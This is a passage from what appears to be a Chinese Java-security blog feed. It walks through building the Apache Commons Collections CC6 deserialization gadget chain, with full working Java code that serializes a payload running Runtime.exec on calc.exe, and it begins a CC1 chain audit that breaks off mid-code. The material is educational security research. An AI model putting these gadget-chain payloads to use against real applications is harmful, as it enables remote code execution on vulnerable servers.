class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">// 创建lazymap,并传入chainedTransformer对象</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        LazyMap有一个静态方法可以让我拿到它的对象实例</span><br><span class="hljs-comment">        public static Map decorate(Map map, Factory factory) &#123;</span><br><span class="hljs-comment">        return new LazyMap(map, factory);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">Lazymap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), chainedTransformer);<br>        <span class="hljs-comment">// 创建TiedMapEntry对象，并绑定Lazymap对象</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(Lazymap, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        <span class="hljs-comment">// 创建HashMap对象，并将TiedMapEntry作为Key进行处理</span><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(tiedMapEntry, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;src/main/upload/ApacheCC6.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(map);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserializeCC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src/main/upload/ApacheCC6.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;运行完成&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ApacheCC6</span> <span class="hljs-variable">cc6</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApacheCC6</span>();<br>        cc6.CC6_ser();<br>        <span class="hljs-comment">// cc6.unserializeCC6();</span><br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250219110438126.png" alt="image-20250219110438126"></p><p>成功弹出计算机</p><blockquote><p>这只是在序列化，并没有反序列化他就弹出了计算器。同时报错<code>Exception in thread &quot;main&quot; java.io.NotSerializableException: java.lang.ProcessImpl</code></p><p>我们在下面解决这个问题</p></blockquote><h2 id="三、异常调试"><a href="#三、异常调试" class="headerlink" title="三、异常调试"></a>三、异常调试</h2><p>由于<code>HashMap的put方法</code>会导致提前调用<code>hashCode()</code>方法，从而在序列化的时候就命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Exception in thread <span class="hljs-string">&quot;main&quot;</span> java.io.NotSerializableException: java.lang.ProcessImpl<br></code></pre></td></tr></table></figure><p>这个报错也是Runtime在执行方法时的底层类实现类对象，由于<code>ProcessImpl对象</code>不能被序列化而导致的报错</p><p>我们使用<code>ChainedTransformer的Transform()方法</code>一步一步循环从而得到了Runtime类。所以我们在<code>lazyMap</code>实例化的时候不传入<code>ChainedTransformer对象</code>，而是传入一个其他无意义的类。在通过反射的方式修改JVM已经加载的<code>LazyMap</code>对象。修改之后在进行序列化。</p><p><strong>LazyMap实例化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">LazyMap</span> <span class="hljs-variable">Lazymap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-literal">null</span>));<br></code></pre></td></tr></table></figure><p>反射修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LazyMap</span>&gt; Clazz = Lazymap.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> Clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>factory.setAccessible(<span class="hljs-literal">true</span>);<br>factory.set(Lazymap, chainedTransformer);<br></code></pre></td></tr></table></figure><p>修改后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApacheCC6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">CC6_ser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// transformer[]数组,相当于一下代码的执行。</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br><span class="hljs-comment">        Method method = runtimeClass.getMethod(&quot;getRuntime&quot;, null);</span><br><span class="hljs-comment">        Runtime runtime = (Runtime) method.invoke(null);</span><br><span class="hljs-comment">        runtime.exec(&quot;calc.exe&quot;);</span><br><span class="hljs-comment">    */</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">// 1.相当于Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// 2.相当于Method method = runtimeClass.getMethod(&quot;getRuntime&quot;, null);</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 3.相当于runtime = (Runtime) method.invoke(null);</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 4.相当于runtime.exec(&quot;calc.exe&quot;);</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">// 创建lazymap,并传入chainedTransformer对象</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        LazyMap有一个静态方法可以让我拿到它的对象实例</span><br><span class="hljs-comment">        public static Map decorate(Map map, Transformer factory) &#123;</span><br><span class="hljs-comment">        return new LazyMap(map, factory);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">Lazymap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-literal">null</span>));<br><br>        <span class="hljs-comment">// 创建TiedMapEntry对象，并绑定Lazymap对象</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(Lazymap, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        <span class="hljs-comment">// 创建HashMap对象，并将TiedMapEntry作为Key进行处理</span><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(tiedMapEntry, <span class="hljs-string">&quot;lingx5&quot;</span>);<br><br>        <span class="hljs-comment">// 在执行put之后，反射修改LazyMap对象的factory属性</span><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LazyMap</span>&gt; Clazz = Lazymap.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> Clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(Lazymap, chainedTransformer);<br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;src/main/upload/ApacheCC6.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(map);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserializeCC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src/main/upload/ApacheCC6.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;运行完成&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ApacheCC6</span> <span class="hljs-variable">cc6</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApacheCC6</span>();<br>        cc6.CC6_ser();<br>        cc6.unserializeCC6();<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在没有报错了，但是他也不弹计算机了。我们调试一下看是哪里的问题</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250219124737295.png" alt="image-20250219124737295"></p><p>看到if语句里的表达式为false，所以没有调用<code>factory.transform(key)</code>方法</p><blockquote><p>这是因为在map.put(tiedMapEntry, “lingx5”)执行时，触发TiedMapEntry的hashCode方法调用LazyMap.get(“lingx5”)<code>该key来自TiedMapEntry构造时的第二个参数</code>。此时LazyMap的factory仍是初始值，但根据LazyMap特性，若key不存在会自动创建条目，导致”lingx5”被注入到初始空HashMap中。</p></blockquote><p>我们继续修改，把key（lingx5）删除</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 反射和直接删除都是可以的，因为remove的修饰符是public</span><br><span class="hljs-comment">/*反射删除</span><br><span class="hljs-comment">        Method remove = Clazz.getMethod(&quot;remove&quot;, Object.class);</span><br><span class="hljs-comment">        remove.invoke(Lazymap, &quot;lingx5&quot;);</span><br><span class="hljs-comment">        */</span><br><span class="hljs-comment">// 直接删除</span><br>        Lazymap.remove(<span class="hljs-string">&quot;lingx5&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="四、最终代码"><a href="#四、最终代码" class="headerlink" title="四、最终代码"></a>四、最终代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApacheCC6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">CC6_ser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// transformer[]数组,相当于一下代码的执行。</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br><span class="hljs-comment">        Method method = runtimeClass.getMethod(&quot;getRuntime&quot;, null);</span><br><span class="hljs-comment">        Runtime runtime = (Runtime) method.invoke(null);</span><br><span class="hljs-comment">        runtime.exec(&quot;calc.exe&quot;);</span><br><span class="hljs-comment">    */</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">// 1.相当于Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// 2.相当于Method method = runtimeClass.getMethod(&quot;getRuntime&quot;, null);</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 3.相当于runtime = (Runtime) method.invoke(null);</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 4.相当于runtime.exec(&quot;calc.exe&quot;);</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">// 创建lazymap,并传入chainedTransformer对象</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        LazyMap有一个静态方法可以让我拿到它的对象实例</span><br><span class="hljs-comment">        public static Map decorate(Map map, Transformer factory) &#123;</span><br><span class="hljs-comment">        return new LazyMap(map, factory);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">Lazymap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-literal">null</span>));<br><br>        <span class="hljs-comment">// 创建TiedMapEntry对象，并绑定Lazymap对象</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(Lazymap, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        <span class="hljs-comment">// 创建HashMap对象，并将TiedMapEntry作为Key进行处理</span><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(tiedMapEntry, <span class="hljs-string">&quot;lingx5&quot;</span>);<br><br>        <span class="hljs-comment">// 在执行put之后，反射修改LazyMap对象的factory属性</span><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LazyMap</span>&gt; Clazz = Lazymap.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> Clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(Lazymap, chainedTransformer);<br>        <span class="hljs-comment">// 删除名为ingx5的key</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Method remove = Clazz.getMethod(&quot;remove&quot;, Object.class);</span><br><span class="hljs-comment">        remove.invoke(Lazymap, &quot;lingx5&quot;);</span><br><span class="hljs-comment">        */</span><br><br>        Lazymap.remove(<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;src/main/upload/ApacheCC6.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(map);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserializeCC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src/main/upload/ApacheCC6.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;运行完成&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ApacheCC6</span> <span class="hljs-variable">cc6</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApacheCC6</span>();<br>        cc6.CC6_ser();<br>        cc6.unserializeCC6();<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250219131859662.png" alt="image-20250219131859662"></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Apache-CC链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Apache-CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-CC1 链审计笔记</title>
    <link href="/2025/04/02/java-CC1-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/04/02/java-CC1-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="java-CC1-链条审计"><a href="#java-CC1-链条审计" class="headerlink" title="java-CC1 链条审计"></a>java-CC1 链条审计</h1><p>CC1 是 CommonsCollections1 的简称，它是 Apache Commons Collections 库中的一个已知的反序列化利用链。而这个库也是 java 中比较通用的库。在 java 语言里面有执行系统命令的 Runtime 类</p><blockquote><p>像 php 中的 eval()、system()、exec()、shell_exec()、assert()、passthru()、escapeshellcmd()、pcntl_exec()等命令执行函数相似</p></blockquote><h2 id="CC1-调用链条"><a href="#CC1-调用链条" class="headerlink" title="CC1 调用链条"></a>CC1 调用链条</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">ObjectInputStream<span class="hljs-selector-class">.readObject</span>()<br>    AnnotationInvocationHandler<span class="hljs-selector-class">.readObject</span>()<br>     ChainedTransformer<span class="hljs-selector-class">.transform</span>()<br>     ConstantTransformer<span class="hljs-selector-class">.transform</span>()<br>        <span class="hljs-built_in">Map</span>()<span class="hljs-selector-class">.setValue</span>()<br>    Entry<span class="hljs-selector-class">.setValue</span>()<br>    TransformedMap<span class="hljs-selector-class">.checkSetValue</span>()<br>              InvokerTransformer<span class="hljs-selector-class">.transform</span>()<br>                    Method<span class="hljs-selector-class">.invoke</span>()<br>                    Runtime<span class="hljs-selector-class">.exec</span>()<br></code></pre></td></tr></table></figure><h2 id="终点发现"><a href="#终点发现" class="headerlink" title="终点发现"></a>终点发现</h2><p><strong>InvokerTransformer</strong></p><p>在 <code>InvokerTransformer</code> 类中有一个 <code>transform</code> 方法，他在方法里面对 <strong>传入的参数</strong> 进行了反射，运行了方法。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20240917162213875.png" alt="image-20240917162213875"></p><p>让我们来运行下边代码，看一下这个重点是否是可以运行命令的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApacheCC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testInvoker</span><span class="hljs-params">()</span>&#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;;<br>        <span 